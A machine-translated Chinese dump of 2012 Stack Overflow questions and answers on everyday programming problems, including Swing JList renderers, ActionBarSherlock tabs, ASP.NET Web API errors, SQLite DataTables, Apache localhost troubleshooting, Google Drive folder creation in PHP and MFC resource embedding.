      if (childMax > result) {
        result = childMax;
      }
    });
    return result;
  }
};

drillIn(document.body); 
```

工作小提琴：http: [//jsfiddle.net/bdL5b/1/](http://jsfiddle.net/bdL5b/1/)

在 SO 上，我知道`960`哪个是正确的。基本上，它钻入 DOM 树以找到最靠近根的最宽节点，而不是`0`窗口宽度。因为通常，靠近根节点有一个容器节点来保存站点内容。通常。

不过，不确定您是否会获得 100% 可靠的解决方案。这是一件棘手的事情，因为有很多方法可以设置网站样式。我敢打赌，像可怕地使用绝对定位这样的疯狂东西可能会成为你屁股上的一根刺。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T01:06:53.810

如果你使用 Firefox，[Greasemonkey](https://addons.mozilla.org/en-US/firefox/addon/greasemonkey/)很棒。它将运行您在任何页面上编写的 Javascript（我之前在 Stack Overflow 的网站上使用过它）。

只需使用浏览器的内置“检查元素”来获取您想要扩展的任何内容的 id 并执行以下操作：

```
document.getElementById("content").style.width = "100%";  // content is just an example 
```

我认为中间框的类名是`.container`这样你可以这样做的：

```
var boxes = document.getElementsByClassName("container");
for(var i = 0; i < boxes.length; i++)
{
    boxes[i].style.width = "100%";
} 
```

就任意执行此操作的启发式方法而言，可能没有好的方法可以以不偏不倚的方式对所有网页执行此操作，*而不会显着破坏网站的外观*。

话虽如此，这个或类似的东西可能工作*正常*：

```
var divs = document.getElementsByTagName("div");
for(var i = 0; i < divs.length; i++)
{
    divs[i].style.minWidth = "90%";
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-01T01:40:02.247

哈！我有一些接近的东西（虽然我也会尝试[亚历克斯的方法](https://stackoverflow.com/a/11751403/105570)）：

以下依赖于 jQuery，并且可以说效率低下（我相信它检查 DOM 中的每个元素）；但它不需要在我的机器上花费任何时间，并且至少适用于 SO：

```
(function($) {
  function text($element) {
    return $.trim($element.clone().children().remove().end().text());
  }

  function hasContent($element) {
    return $element.is(":visible") && text($element).length > 0;
  }

  function getExtremeEdges($elements) {
    var extremeLeft = null;
    var extremeRight = null;

    $.each($elements, function(i, el) {
      var $element = $(el);
      var offset = $element.offset();

      if (!extremeLeft || offset.left < extremeLeft) {
        extremeLeft = offset.left;
      }
      if (!extremeRight || (offset.left + $element.width()) > extremeRight) {
        extremeRight = offset.left + $element.width();
      }
    });

    return [extremeLeft, extremeRight];
  }

  var $elementsWithContent = $("*").filter(function(i, el) {
    return hasContent($(el));
  });

  var extremeEdges = getExtremeEdges($elementsWithContent);

  var width = extremeEdges[1] - extremeEdges[0];

  var desiredWidth = $(document).width() * 0.95;

  if (width < desiredWidth) {
    $("body").css("zoom", (desiredWidth / width));
  }

}(jQuery)); 
```

缩小（用作书签）：

```
(function(a){function b(b){return a.trim(b.clone().children().remove().end().text())}function c(a){return a.is(":visible")&&b(a).length>0}function d(b){var c=null;var d=null;a.each(b,function(b,e){var f=a(e);var g=f.offset();if(!c||g.left<c){c=g.left}if(!d||g.left+f.width()>d){d=g.left+f.width()}});return[c,d]}var e=a("*").filter(function(b,d){return c(a(d))});var f=d(e);var g=f[1]-f[0];var h=a(document).width()*.95;if(g<h){a("body").css("zoom",h/g)}})(jQuery); 
```

是时候狗食这只小狗了……

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-01T01:04:30.400

没有太大的进展，但我把我尝试过的东西放在一边，以防它激励其他人：

**效果比你想象的要糟糕得多**

制作一个小书签，使 body 的所有子项都具有 100% 的宽度。然后，如果您再次单击小书签，它会使 body 的子项的所有子项具有 100% 的宽度。这样，用户就可以点击，直到网站变得对他们更满意 :)

```
var levels = levels ? levels + 1 : 1;
$('body *:nth-child(' + levels + ')').css({ width: '100%' }); 
```

.

**第一种尝试找出第一个有意义的内容在哪里的方法**

很酷的谜题，我正在使用 jQuery 的强大功能。所以我通过尝试找到第一个非空元素来接近它，而`.contents()`不是`.children()`因为内容也获取文本节点。这是我到目前为止所拥有的。它很接近，但不太正确，因为它似乎搜索得太深了：

```
$('body *:visible').filter(function(){
    return moreNonEmptyContentThanChildren($(this));
}).first();

function moreNonEmptyContentThanChildren(el) {
    var contentCount = 0;
    var contents = el.contents();
    for (c = 0; c < contents.length; c++) {
        elc = contents[c];
        if (elc.nodeType != 3 || (elc.nodeType == 3 && $.trim($(elc).text()) != '')) {
            contentCount ++;
        }
    }
    return contentCount != el.children().length;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-01T01:22:10.977

我认为每个网站都会有太大的不同，以至于没有一个标准是自动调整其内容的大小。我相信 CSS 是关键，通过使用用户定义的样式表。或类似[时尚](http://userstyles.org/help/stylish)的东西。请参阅[https://superuser.com/questions/128666/custom-per-site-stylesheet-extension-for-firefox](https://superuser.com/questions/128666/custom-per-site-stylesheet-extension-for-firefox)

或[https://addons.mozilla.org/en-us/firefox/addon/style-sheet-chooser-ii/](https://addons.mozilla.org/en-us/firefox/addon/style-sheet-chooser-ii/)

# java - Jlist 自定义渲染器

> ID：11751191
> 
> 赞同：2
> 
> 时间：2012-08-01T01:01:14.717
> 
> 标签：java, swing, jlist, renderer

我正在尝试添加 ai 猜测您会将其称为列表中每个项目的子列表。我已经构建了一个自定义渲染器，它提供了以下输出。正如您所看到的，这里有些东西不正确，我没有运气找到我的问题的答案。我猜我需要更改面板布局中的某些内容以获得正确的结果，但不知道是什么。

[http://i.stack.imgur.com/jCKjJ.jpg](http://i.stack.imgur.com/jCKjJ.jpg)

```
import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.Container;
import java.awt.GridLayout;
import java.util.Random;
import javax.swing.JCheckBox;
import javax.swing.JLabel;
import javax.swing.JList;
import javax.swing.JPanel;
import javax.swing.JSeparator;
import javax.swing.ListCellRenderer;
import javax.swing.border.EmptyBorder;

public class GAListRendererAdv extends Container implements ListCellRenderer {
private static final long serialVersionUID = 1L;
private JPanel pnl = new JPanel();
private Random rnd = new Random();

public Component getListCellRendererComponent(JList list, Object value, int index, boolean isSelected,
        boolean cellHasFocus) {

    pnl.setLayout(new BorderLayout(0, 0));

    JCheckBox chckbxSomething = new JCheckBox("something");
    pnl.add(chckbxSomething, BorderLayout.NORTH);

    JSeparator separator = new JSeparator();
    pnl.add(separator, BorderLayout.CENTER);

    JPanel panel_1 = new JPanel();
    panel_1.setBorder(new EmptyBorder(0, 35, 0, 0));
    pnl.add(panel_1, BorderLayout.SOUTH);
    panel_1.setLayout(new GridLayout(0, 1, 0, 0));

    int rndNum = rnd.nextInt(5) + 1;

    for (int i = 0; i < rndNum; i ++) {
    JLabel lblNewLabel2 = new JLabel("New label");
    panel_1.add(lblNewLabel2);
    }

    return pnl;
}
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T01:21:08.917

首先，请记住，`CellRenderers`在 Swing 中用作“橡皮图章”。这样做是为了节省内存并帮助提高性能。这允许组件，如`JList`，维护对渲染器的单个引用，但仍绘制列表中的所有项目。

这意味着，无论何时`getListCellRendererComponent`调用，渲染器都将处于与上次调用时相同的状态。

从我从您的代码中可以看出，这意味着每次调用渲染器时，您都会添加另一个复选框、另一个分隔符、另一个面板和更多标签......

其次，对于渲染器，尽量不要`getListCellRendererComponent`在可能的情况下创建任何东西，这只会增加你的内存使用量（你的部分代码可能没有选择）。

第三，`JList`不支持编辑器，渲染器不是编辑器，原因我前面已经说了。

第四。在将所有元素添加到面板之前，请尝试从面板的“正文”部分中删除内容。

```
// Don't use Container, use JPanel instead, mixing heavy and light weight components
// is never a good idea :P
public class GAListRendererAdv extends JPanel implements ListCellRenderer {
    private static final long serialVersionUID = 1L;
    private JPanel pnl = new JPanel();
    private Random rnd = new Random();

    private JCheckBox checkBox;

    public GAListRendererAdv() {

        setLayout(new BorderLayout(0, 0));            
        checkBox = new JCheckBox();

        add(checkBox, BorderLayout.NORTH);
        add(new JSeparator(), BorderLayout.CENTER);

        pnl = new JPanel(new GridLayout(0, 1, 0, 0));
        pnl.setBorder(new EmptyBorder(0, 35, 0, 0));

        add(pnl BorderLayout.SOUTH); // Don't forget to add the panel :P

    }

    public Component getListCellRendererComponent(JList list, Object value, int index, boolean isSelected, boolean cellHasFocus) {

        pnl.removeAll();
        int rndNum = rnd.nextInt(5) + 1;

        for (int i = 0; i < rndNum; i ++) {
            JLabel lblNewLabel2 = new JLabel("New label");
            pnl.add(lblNewLabel2);
        }

        return this;
    } 
```

# linux - 混帐添加。崩溃和 git commit -a 崩溃

> ID：11751193
> 
> 赞同：4
> 
> 时间：2012-08-01T01:01:53.857
> 
> 标签：linux, git

我在我的 bitbucket 帐户上创建了一个新的 repo 并使用

`git clone git@bitbucket.org:themonkeymixer/zte-warp-cm9.git`

我在 repo 中添加了一个文件夹，其中包含 21 个文件（总共 60KB）。

然后我发出`git add .`This works（这次）

然后`git commit -a -m 'added initial folder'`

计算机完全冻结，计算机无响应，直到`ctrl +c`按下然后几分钟后解锁

有任何想法吗？

```
$ git --version
git version 1.7.9.5 
```

我也尝试将 cm9 源添加为单个文件夹，当源中有空文件夹时，它似乎随机崩溃

但是我添加了名为 README 的文件，其中包含文本 this is the README

它仍然崩溃

# android - 如何设置最初选择的选项卡 ActionBarSherlock

> ID：11751194
> 
> 赞同：0
> 
> 时间：2012-08-01T01:01:56.740
> 
> 标签：android, tabs, actionbarsherlock

我正在尝试使用 ActionBarShelock 将我的 Tab2 设置为最初选择的选项卡，但我无法开始工作。

这些选项卡运行良好，但我无法在应用程序启动时选择第二个选项卡而不是第一个选项卡。这是我的代码：

```
@Override
public void onCreate(Bundle savedInstanceState) {
    setTheme(R.style.AppThemeLightDarkActionBar);
    super.onCreate(savedInstanceState);

    getSupportActionBar().setDisplayShowTitleEnabled(true);

    mViewPager = new ViewPager(this);
    mViewPager.setId(R.id.pager);

    setContentView(mViewPager);

    ActionBar bar = getSupportActionBar();
    bar.setNavigationMode(ActionBar.NAVIGATION_MODE_TABS);

    mTabsAdapter = new TabsAdapter(this, mViewPager);

    mTabsAdapter.addTab(bar.newTab().setText("Tab1"), Tab1.class, null);
    mTabsAdapter.addTab(bar.newTab().setText("Tab2"),
            Tab2.class, null);
    mTabsAdapter.addTab(bar.newTab().setText("Tab3"), Tab3.class,
            null);
    mTabsAdapter.addTab(bar.newTab().setText("Tab4"), Tab4.class, null);

}

public static class TabsAdapter extends FragmentPagerAdapter implements
        ActionBar.TabListener, ViewPager.OnPageChangeListener {
    private final Context mContext;
    private final ActionBar mActionBar;
    private final ViewPager mViewPager;
    private final ArrayList<TabInfo> mTabs = new ArrayList<TabInfo>();

    static final class TabInfo {
        private final Class<?> clss;
        private final Bundle args;

        TabInfo(Class<?> _class, Bundle _args) {
            clss = _class;
            args = _args;
        }
    }

    public TabsAdapter(SherlockFragmentActivity activity, ViewPager pager) {
        super(activity.getSupportFragmentManager());
        mContext = activity;
        mActionBar = activity.getSupportActionBar();
        mViewPager = pager;
        mViewPager.setAdapter(this);
        mViewPager.setOnPageChangeListener(this);
    }

    public void addTab(ActionBar.Tab tab, Class<?> clss, Bundle args) {
        TabInfo info = new TabInfo(clss, args);
        tab.setTag(info);
        tab.setTabListener(this);
        mTabs.add(info);
        mActionBar.addTab(tab);
        notifyDataSetChanged();
    }

    @Override
    public int getCount() {
        return mTabs.size();
    }

    @Override
    public Fragment getItem(int position) {
        TabInfo info = mTabs.get(position);
        return Fragment.instantiate(mContext, info.clss.getName(),
                info.args);
    }

    public void onPageScrolled(int position, float positionOffset,
            int positionOffsetPixels) {
    }

    public void onPageSelected(int position) {
        mActionBar.setSelectedNavigationItem(position);
    }

    public void onPageScrollStateChanged(int state) {
    }

    public void onTabSelected(Tab tab, FragmentTransaction ft) {
        Object tag = tab.getTag();
        for (int i = 0; i < mTabs.size(); i++) {
            if (mTabs.get(i) == tag) {
                mViewPager.setCurrentItem(i);
            }
        }
    }

    public void onTabUnselected(Tab tab, FragmentTransaction ft) {
    }

    public void onTabReselected(Tab tab, FragmentTransaction ft) {
    }
} 
```

我怎样才能让它工作？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T01:12:13.943

在方法结束时使用它`onCreate`：

```
mViewPager.setCurrentItem(1); 
```

上面的[方法](http://developer.android.com/reference/android/support/v4/view/ViewPager.html#setCurrentItem%28int%29)应该是从0开始的，所以1是第二页。

# javascript - 如何在 Safari 6 (Mountain Lion) 中查看 JavaScript 错误消息

> ID：11751200
> 
> 赞同：2
> 
> 时间：2012-08-01T01:02:24.653
> 
> 标签：javascript, safari, osx-mountain-lion

我正在使用 Mountain Lion 附带的 Safari 6。他们改变了关于网络检查器的一切，我迷路了。

当我收到未捕获的 JavaScript 错误时，Safari 会暂停执行，缩放到损坏的文件和行，在左侧显示调用堆栈，在右侧显示局部变量。

但是描述错误的文本在哪里？它不在日志中。左侧或右侧的小标签都没有显示任何内容。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T17:36:40.257

看起来只有当您尝试通过单击“继续脚本执行”按钮继续执行时，该消息才会出现在当前日志中。

对我来说，这也有点奇怪。也许值得在[https://feedbackassistant.apple.com/](https://feedbackassistant.apple.com/)上提交错误报告？

# http - C#/ASP.NET - 通过 URL 调用 Web API 操作？: HTTP 错误 500

> ID：11751201
> 
> 赞同：0
> 
> 时间：2012-08-01T01:02:25.600
> 
> 标签：http, rest, asp.net-mvc-4, asp.net-web-api

我正在开发一个 ASP.NET MVC 4 应用程序。从数据库中获取信息并在网页上显示在这个阶段进展顺利。然后我决定与我的应用程序的进展并行开发一个 Web API。到目前为止一切顺利，直到我尝试使用本地主机上的 URL 对其进行测试。

当我尝试它时，我收到了 HTTP 错误 500。

`http://localhost:23375/`我从 VS 2010 运行应用程序，它在我的浏览器中打开。最后，我附加了我的 API 调用，将其带到：

```
http://localhost:23375/api/Performance/ShowMachines 
```

当我按下回车键时，我得到了错误。为什么会这样，我该如何解决？

以下是相关代码：

性能控制器.cs

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Web.Http;

using PerfMon.Models;

namespace PerfMon.Controllers
{
    public class PerformanceController : ApiController
    {

        PerfMonDataRepository perfRep = new PerfMonDataRepository();

        // GET /performance/machines
        [HttpGet]
        public IQueryable<Machine> ShowMachines()
        {
            return perfRep.GetAllMachines();
        }

    }
} 
```

全球.asax.cs

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Http;
using System.Web.Mvc;
using System.Web.Optimization;
using System.Web.Routing;

namespace PerfMon
{
    // Note: For instructions on enabling IIS6 or IIS7 classic mode, 
    // visit http://go.microsoft.com/?LinkId=9394801

public class WebApiApplication : System.Web.HttpApplication
{
    protected void Application_Start()
    {
        AreaRegistration.RegisterAllAreas();

        FilterConfig.RegisterGlobalFilters(GlobalFilters.Filters);
        RouteConfig.RegisterRoutes(RouteTable.Routes);
        BundleConfig.RegisterBundles(BundleTable.Bundles);
    }

    public static void RegisterRoutes(RouteCollection routes)
    {

        routes.IgnoreRoute("{resource}.axd/{*pathInfo}");

        routes.MapHttpRoute(
            name: "Machines",
            routeTemplate: "api/{controller}/{action}",
            defaults: new { 
                controller = "Performance",
                action = "ShowMachines"                    
            }
        );
    }

}
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T16:22:23.147

我遇到了同样的问题，我想我把它缩小到 HTTP 的 Accept 标头。当您通过 JavaScript 调用 API 时，将 Accept 标头作为 JSON 或 XML 传递，它可以工作。

当您从浏览器拨打电话时，您要求的是不同的内容类型，因此您会收到错误 500。

我仍然无法确认，但看起来是这样的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-01T22:13:34.683

问题是，当我创建 .dbml 文件并将表拖放到其中时，自动生成的 DataContext 类创建了 EntitySet 对象来表示外键关系。我创建了带有获取沙集的简单类以返回 JSON，而不是 DataContext 中的类，不包括 EntitySet 对象。结果，它就像一个魅力。显然 EntitySets 是不可序列化的，因此给出了 500 错误。

# sql - 在事务中使用 SQL 'select' 填充数据表

> ID：11751203
> 
> 赞同：0
> 
> 时间：2012-08-01T01:02:48.097
> 
> 标签：sql, vb.net, sqlite

我想用 SQL 选择语句的结果填充数据表，但使用事务。我使用事务的原因是因为我有一个名称列表（作为数据表），并且我想遍历名称列表并选择名称 = 列表中名称的数据库行。数据库中有 500,000 个名称，我只想检索相关行。我有该过程的代码，因为我认为它应该看起来像（未经测试）但我不知道如何将数据放入数据表中......所以我错过了我声明数据表和该表的“填充”的东西，有人可以帮忙吗？或者建议我如何在不单独查找每个名称的情况下从数据库中获取信息。

```
 Using connection As New SQLite.SQLiteConnection(R2WconectionString)
            connection.Open()
            Dim sqliteTran As SQLite.SQLiteTransaction = connection.BeginTransaction()
            Try
                oMainQueryR = "SELECT NameID, Address, Ocupation FROM Employees Where Name= :Name"
                Dim cmdSQLite As SQLite.SQLiteCommand = connection.CreateCommand()
                With cmdSQLite
                    .CommandType = CommandType.Text
                    .CommandText = oMainQueryR
                    .Parameters.Add(":Name", SqlDbType.VarChar)
                End With
               'Prevent duplicate selects by using a dictionary
                Dim NameInalready As New Dictionary(Of String, String) 

                For Each row As DataRow In TheLIST.Rows
                    If NameInalready.ContainsKey(row.Item("Name")) Then
                    Else
                        NameInalready.Add(row.Item("Name"), "")
                        cmdSQLite.Parameters(":Name").Value = row.Item("Name")
                        cmdSQLite.ExecuteNonQuery()
                    End If

                Next

                sqliteTran.Commit()

            Catch ex As Exception
            End Try
        End Using 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T01:15:26.000

首先，您不需要事务，因为您没有更新数据库。

其次，根据 TheLIST 中可能的名称数量，您可能值得将名称选择器更改为`IN`(即`SELECT * FROM Employees WHERE Name IN ('name1', 'name2')`。但是，如果您预计超过 10 个，这可能不值得麻烦。

最后，您需要创建一个新的 DataTable 来保存结果。然后您需要创建一个将 cmdSqlLite 作为构造函数参数传递的 DataAdapter。最后，将您的 ExecuteNonQuery 替换为 DataAdapter.Fill(DataTable)。

例如（在 之后`Dim cmdSQLite`）：

```
Dim oDataTable As New DataTable("Employees")
Dim oAdapter As New SqliteDataAdapter(cmdSQLite) 
```

并将该`ExecuteNonQuery`行替换为：

```
oAdapter.Fill(oDataTable) 
```

我将通过说它可能需要一些调整来限定此代码。我只使用类对象和集合，所以我的偏好实际上是加载 Employee 类实例的集合。

我会通过用 ExecuteReader 替换 ExecuteNonQuery 然后将读取的数据加载到新的类实例中来做到这一点。这种方法解决了跨服务边界序列化数据的各种问题（例如，用于 Web 服务的 Xml），如果需要，还允许您将业务逻辑嵌入到类中。

# php - Apache/PHP - 本地主机停止工作。我怎样才能让它再次工作？

> ID：11751204
> 
> 赞同：0
> 
> 时间：2012-08-01T01:02:48.960
> 
> 标签：php, apache, windows-7, apache2, localhost

我已经在我的计算机上安装了 Apache2.2、PHP 5 和 MySQL。直到昨晚一切正常。突然，我无法再连接到本地主机。我认为我的计算机感染了木马，但它已被删除，我无法重新连接到我的本地主机。

我已经在记事本中更新了我的主机文件 Windows(C:)/Windows/System32/drivers/etc 主机：见附件。

我已经在 CMD 提示符下测试了我的连接，见附件。

您会注意到 [::]1，但在更新我的主机文件后，它现在显示为 127.0.0.1

此外，端口 80 正在监听

而不是我的网络浏览器将页面加载为 localhost/vote/home.php 现在它加载为 file:///C:/Websites/Vote/home.php 现在我的 PHP 不再工作，即没有被拉入我的网页.

...无法在本地主机上建立与服务器的连接。

为什么我的本地主机不工作？想法？先感谢您。

此外，我的网络浏览器页面在请求 localhost 时不会超时....

（我是新用户，所以无法发布图片）？

× 257296

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T10:57:06.720

一些事情要尝试：

*   确保 Apache 确实在运行，它在启动期间没有失败。
*   检查它是否正在侦听预期的端口（80，或者您配置的任何端口）

    > ```
    > > netstat -nb 
    > ```

*   检查您的主机文件以确保那里没有任何可疑之处。`localhost`应该指向 127.0.0.1，但也许它已被您的病毒设置为指向其他地方。

如果您无法弄清楚，您可以随时尝试删除/卸载并尝试重新设置。如果这是一台开发机器，我可以推荐使用[WAMP](http://wampserver.com/en/)包安装程序，而不是自己设置。它提供了在 php/apache/mysql 版本之间相当容易的切换以及大多数常规 apache 和 php 模块的轻松切换。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T01:15:58.363

如果您将 localhost/vote/home.php 放入浏览器的地址栏中，您应该会收到无法连接的错误，而不是重定向到文件。地址栏将显示 file:///C:/Websites/Vote/home.php 的唯一情况是您直接在浏览器中打开该文件。

您关于 apache 为何不工作的详细信息尚不清楚，但您可以尝试几件事。首先，你是如何安装apache的，它是一个服务吗？您可以通过转到控制面板 > 管理工具 > 服务来检查这一点，并查看 apache 是否在该列表中。如果是，则必须启动它，如果不是，则 apache 未作为服务安装，您需要通过运行可执行文件来启动它。转到 httpd 可执行文件所在的目录并运行它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-09-30T05:13:56.903

以管理员身份运行命令提示符并转到 Apache bin 文件夹（通常为 'cd \apache\bin' ）并键入 httpd -k start。它对我有同样的问题。

# php - 在google drive php中创建一个文件夹

> ID：11751207
> 
> 赞同：3
> 
> 时间：2012-08-01T01:03:03.667
> 
> 标签：php, directory, google-drive-api, google-drive-realtime-api

有什么方法可以使用 PHP 在谷歌驱动器上创建一个文件夹？在过去的 72 小时里，我一直在搜索所有网络，但没有任何结果。你们觉得怎么样？谢谢 ！

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2019-10-29T15:59:00.340

这是使用 Google Drive API v3 和 OAuth 访问令牌的更新方法：

```
$googleClient = new \Google_Client();
$googleClient->setApplicationName('My App');
$googleClient->setAccessToken(env('GOOGLE_OAUTH_ACCESS_TOKEN'));
$googleClient->setClientId(env('GOOGLE_APP_ID'));
$googleClient->setClientSecret(env('GOOGLE_APP_SECRET'));

if ($googleClient->isAccessTokenExpired()) {
    $googleClient->fetchAccessTokenWithRefreshToken();
}

$api = new \Google_Service_Drive($client);

$file = new \Google_Service_Drive_DriveFile();
$file->setName('Folder Name');
$file->setMimeType('application/vnd.google-apps.folder');

$folder = $api->files->create($file); 
```

这使用谷歌客户端库

*   [https://developers.google.com/drive/api/v3/quickstart/php](https://developers.google.com/drive/api/v3/quickstart/php)
*   [https://developers.google.com/drive/api/v3/reference](https://developers.google.com/drive/api/v3/reference)

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-08-01T01:06:18.397

### 创建文件夹：

“在 Drive API 中，文件夹本质上是一个文件——由特殊文件夹 MIME 类型 application/vnd.google-apps.folder 标识。您可以通过插入具有此 MIME 类型和文件夹标题的文件来创建新文件夹。设置文件夹标题时不要包含扩展名。

要为特定文件夹创建子文件夹，请在文件的 parents 属性中指定正确的 ID。例如，在 id 值为 0ADK06pfg 的“images”文件夹中创建文件夹“pets”：

```
POST https://www.googleapis.com/drive/v2/files
Authorization: Bearer {ACCESS_TOKEN}
Content-Type: application/json
...
{
  "title": "pets",
  "parents": [{"id":"0ADK06pfg"}]
  "mimeType": "application/vnd.google-apps.folder"
} 
```

来源：[https ://developers.google.com/drive/folder](https://developers.google.com/drive/folder)

示例：[https ://developers.google.com/drive/examples/php](https://developers.google.com/drive/examples/php)

# javascript - 您如何使用 javascript 测量 3rd 方广告加载时间？

> ID：11751208
> 
> 赞同：4
> 
> 时间：2012-08-01T01:03:27.420
> 
> 标签：javascript, performance, page-load-time

我的网页上有一个*第 3^方广告块。*使用`javascript`，我如何测量加载、解析响应和呈现广告块所需的总时间？

我想将此时间信息发送回我的服务器以进行报告。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T01:31:56.577

您不能仅仅依靠`javascript`为您提供您所追求的解决方案。最大的问题是难以以编程方式确定事件何时*加载*、*解析*和*渲染*发生。最接近的方法是记录发送请求和定期检查广告容器中的内容之间的时间。

现在，如果您确实知道广告提供商将返回的确切内容模板，您将需要使用一个脚本，该脚本将定期检查模板中的所有项目是否已加载，从而测量时间。

另一种技术是使用`Ajax`. 如果您能够使用 加载提供商的广告`ajax`，您始终可以使用回调计算其花费的时间，然后将广告动态添加到页面中。（另请参阅：[如何测量函数执行所花费的时间](https://stackoverflow.com/questions/313893/how-to-measure-time-taken-by-a-function-to-execute)）要超越这一点，您将需要广告提供商为您提供一个`api`或`callbacks`您可以挂钩的。

* * *

我建议看一下[Boomerang](https://github.com/lognormal/boomerang)，因为它有助于从最终用户的角度衡量您网站的性能。除此之外，您还受到外部工具的支配，例如：

*   所有主流浏览器都提供浏览器开发者工具。在 Chrome 中使用*网络*或*时间线*标签
*   [http://tools.pingdom.com/](http://tools.pingdom.com/)
*   [http://www.webpagetest.org/](http://www.webpagetest.org/)

# class - 将资源嵌入可重用 MFC 类的正确方法是什么？

> ID：11751209
> 
> 赞同：2
> 
> 时间：2012-08-01T01:03:28.287
> 
> 标签：class, mfc, resource-files

我正在编写一个 C++（特别是 MFC）类，它使用外部 .gif 图像文件并在经过一些处理后生成另一个图像文件。如果初始图像可以以某种方式嵌入到代码中，那就太好了。我在 MSDN 中阅读了有关使用多个 .rc 文件的信息，整个事情看起来相当复杂。

我想从经历过这个问题的人那里知道如何处理这个问题。

**编辑**：对不起，我不清楚。我正在编写的课程应该是独立的，所以我可以再次使用它。如果我将图像放在资源文件中，那么如果在新项目中使用该类将无法编译。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T04:16:15.143

在解决方案资源管理器中，转到资源视图，右键单击并单击，`Add Resource`然后单击`Import`并添加 gif 文件。现在您可以使用您的`Resource ID`来访问代码中的 gif 文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T09:00:20.850

您不能将 MFC 资源嵌入到类或类似的 C++ 容器中。它们只能嵌入到 DLL 或 EXE 文件中——在生成的二进制文件的单独部分中。由于您希望您的类可重用，因此您必须将其放入 DLL 中。因此，您必须使用[AFX_EXT_CLASS](http://msdn.microsoft.com/en-us/library/9xyb5w93%28v=vs.80%29.aspx)关键字标记您的类。

有两种解决方案。

**解决方案#1：**

*   创建一个 MFC DLL 项目 ( `MFC Extension DLL`)。叫它`MyLibrary`什么的。
*   把你所有的独立类放在这个 DLL 中。
*   嵌入所有必要的资源。
*   让您的类从`HINSTANCE`您的 DLL 中加载资源，如下所述。

有几种方法可以检索`HINSTANCE`您的 DLL。如果你问我，最好的解决方案是抓住它`DllMain`。如果您选择`MFC Extension DLL`配置，这将自动完成：

```
static AFX_EXTENSION_MODULE MyLibDLL = { NULL, NULL }; // Make this variable global!
// Then access the hInstance as follows:
LoadResource(MyLibDLL.hModule, ...) 
```

**解决方案#2：**

将您的资源存储为字节缓冲区。或者更好的是，将其转换为[Base64](http://www.google.se/url?sa=t&rct=j&q=base64&source=web&cd=2&sqi=2&ved=0CFcQFjAB&url=http://en.wikipedia.org/wiki/Base64&ei=uRIqUOCIOarg4QTS84CYDg&usg=AFQjCNFxJAMXAr4Jc-0wQvhcp_q4nZlf5w)并将其存储为 ASCII 字符串。但请记住不要炸毁堆栈！在项目设置中保持资源较小或增加堆栈大小。例子：

```
const char *encodedResource = "SGVsbG8gd29ybGQh";
char *data = decode(encodedResource);
foo(data); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-03T11:05:12.140

只是将文件添加到资源中不会将该文件嵌入到实际资源文件中，它只是链接到该文件。如果你打开你的 .rc 文件，你会看到它说：

```
IDB_GIF_MYIMAGE     GIF     "artwork\\mygif.gif" 
```

在编译过程中，资源将包含在 EXE 中，您使用资源 id 引用它`IDB_GIF_MYIMAGE`。您可以在其他项目中引用相同的文件，而无需复制该文件。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-08T14:24:01.793

要在不使用资源文件的情况下将图像（或任何其他类型的二进制数据）嵌入到您的类中，请使用 bin2c 实用程序，例如，您可以从此处下载它：[http ://www.opensource.apple.com/source/libpcap /libpcap-16/libpcap/msdos/bin2c.c](http://www.opensource.apple.com/source/libpcap/libpcap-16/libpcap/msdos/bin2c.c)。在文件上运行它会产生基本上是一个静态数组，其中文件的字节作为该数组的成员。将此数组填充到 .h 文件中（或将其放在类的标题中，或使其成为静态成员...），然后您将在内存中使用该文件，而无需使用 LoadResource() 及其兄弟.

如果您想将它与 CImage::Load() 一起使用，您将必须编写自己的从 IStream 派生的类，并以某种方式实现一些方法，以便它们从内存中“读取”。我不知道有什么方法可以让 CImage 从 gif 文件的内存表示中解码图像。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-13T14:03:28.530

我认为最好的解决方案就是记录要使用该类，您还必须将某个 .gif 文件导入到您的项目中，并给它一个特定的预期标识符（例如 IDB_MYCLASS_MYGIF）。然后，您可以使用预处理器来检测资源是否已正确添加，例如：

```
#ifndef IDB_MYCLASS_MYGIF
    #error Make sure you import mygif.gif to the project.  See docs for more info.
#endif 
```

这将阻止类编译，直到用户正确导入图像。或者，如果未提供默认图像，您可以只使用 #ifdefs 回退到不使用默认图像的代码。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-15T14:36:03.653

[查看http://www.codeproject.com/Articles/5371/ToDoList-6-5-4-Feature-Release-An-effective-and-fl](http://www.codeproject.com/Articles/5371/ToDoList-6-5-4-Feature-Release-An-effective-and-fl)中提供的 CRuntimeDialog 类。它提供了一种从构成资源定义的字符串创建对话框的方法。

# php - 在 php 附近的邮政编码页面中返回 Sql 错误

> ID：11751211
> 
> 赞同：0
> 
> 时间：2012-08-01T01:03:51.850
> 
> 标签：php, mysql

> **可能重复：**
> [mysql_fetch_array() 期望参数 1 是资源，选择中给出的布尔值](https://stackoverflow.com/questions/2973202/mysql-fetch-array-expects-parameter-1-to-be-resource-boolean-given-in-select)

